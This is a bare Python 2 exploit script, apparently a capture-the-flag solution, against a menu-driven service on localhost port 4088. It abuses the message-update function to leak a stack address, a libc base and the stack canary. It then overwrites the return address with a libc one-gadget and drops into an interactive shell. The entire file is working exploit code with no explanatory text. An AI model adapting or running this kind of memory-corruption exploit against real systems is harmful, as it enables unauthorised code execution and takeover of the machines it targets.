import socket, struct, telnetlib
import time


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def update(buf):
    print 'update'

    read_until(f, '>> ')
    f.write('1\n')

    read_until(f, 'Input new message >> ')

    f.write(buf + '\n')


def leak():
    print 'leak'
    time.sleep(0.1)

    read_until(f, '>> ')
    f.write('2\n')

    read_until(f, 'Name : ')
    return read_until(f).rstrip('\n')


s, f = sock("127.0.0.1", 4088)

read_until(f, 'Name >> ')
f.write('thisisname\n')

read_until(f, 'Age >> ')
f.write('20\n')

read_until(f, 'Message >> ')
f.write('hog\n')


buf  = 'A' * 0x10
buf += '\xa0'
# buf += '\x20'
update(buf)

data = leak()
addr_stack = u64(data.ljust(8, '\x00'))
addr_rip = addr_stack + 0x48
print hex(addr_stack)

buf  = 'B' * 0x10
buf += p64(addr_rip)
update(buf)

offset_libc_start_main = 0x329830
offset_libc_start_main = 0x21830
offset_libc_start_main = 0x20830
data = leak()
addr_libc_start_main = u64(data[:8])
addr_libc = addr_libc_start_main - offset_libc_start_main
print hex(addr_libc)


addr_canary = addr_stack + 0x28 + 1
buf = 'C' * 0x10
buf += p64(addr_canary)
update(buf)

data = leak()
canary = u64('\x00' + data[:7])
print hex(canary)


addr_one_gadget = addr_libc + 0x45216
print 'addr_one_gadet = {}'.format(hex(addr_one_gadget))

buf = ''
buf += '\x00' * 0x38
buf += p64(canary)
buf += p64(0)
buf += p64(0)
buf += p64(0)
buf += p64(addr_one_gadget) # overwrite rip

update(buf)

read_until(f, 'exit')
read_until(f, '>> ')
f.write('0\n')


shell(s)
